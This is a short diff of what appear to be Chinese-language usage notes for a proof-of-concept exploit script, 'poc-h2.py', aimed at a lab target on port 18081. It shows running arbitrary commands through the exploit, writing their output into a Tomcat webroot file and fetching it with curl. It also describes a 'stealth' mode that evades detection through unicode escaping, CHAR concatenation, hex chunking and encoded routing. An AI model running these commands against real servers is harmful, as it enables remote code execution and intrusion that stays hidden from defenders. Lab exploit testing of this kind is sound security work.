@@ -40,7 +40,8 @@
 
 # 交互模式（默认）：GET ?c= 参数化, 即时执行
 python3 poc-h2.py -t http://<靶场>:18081                        # 默认命令: id/hostname/date 落地并回读
-python3 poc-h2.py -t http://<靶场>:18081 -c "id"
+python3 poc-h2.py -t http://<靶场>:18081 -c "id > /usr/local/tomcat/webapps/webroot/xxxx.txt"
+curl http://<靶场>:18081/webroot/xxxx.txt
 python3 poc-h2.py -t http://<靶场>:18081 --shape stealth        # 全隐身: \u全转义+CHAR拼后缀+hex切块
                                                                 #         +编码路由+body参数+绝对URI
 
